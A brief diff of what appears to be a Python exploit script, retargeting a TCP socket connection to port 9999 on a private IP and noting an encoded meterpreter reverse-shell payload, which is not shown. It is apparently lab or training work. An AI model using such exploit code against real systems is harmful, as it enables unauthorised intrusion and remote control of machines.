@@ -4,7 +4,7 @@
 from socket import *
 
 s=socket(AF_INET,SOCK_STREAM)
-s.connect(('192.168.1.1',9999)) #Our target
+s.connect(('192.168.101.146',9999)) #Our target
 
 #Printable ASCII encoded meterpreter reverse shell
 #Note - IP of reverse shell is currently a random IP
